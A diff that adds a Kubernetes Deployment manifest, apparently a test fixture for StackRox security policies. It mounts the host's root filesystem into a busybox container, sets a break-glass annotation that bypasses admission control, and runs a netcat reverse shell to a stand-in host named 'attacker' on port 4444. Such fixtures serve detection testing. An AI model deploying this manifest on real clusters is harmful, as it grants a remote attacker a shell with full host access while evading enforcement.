@@ -1,0 +1,32 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+    name: hostmount-container
+    namespace: security
+    labels:
+      app: hostmount-container
+    annotations:
+      admission.stackrox.io/break-glass: "true"
+spec:
+    replicas: 1
+    selector:
+      matchLabels:
+        app: hostmount-container
+    template:
+      metadata:
+        labels:
+          app: hostmount-container
+      spec:
+        containers:
+        - name: busybox
+          image: busybox:1.29.2
+          command: ["/bin/sh"]
+          args: ["-c", "nc attacker 4444 -e /bin/sh"]
+          volumeMounts:
+          - name: host
+            mountPath: /mnt_path
+        volumes:
+        - name: host
+          hostPath:
+            path: /
+            type: Directory
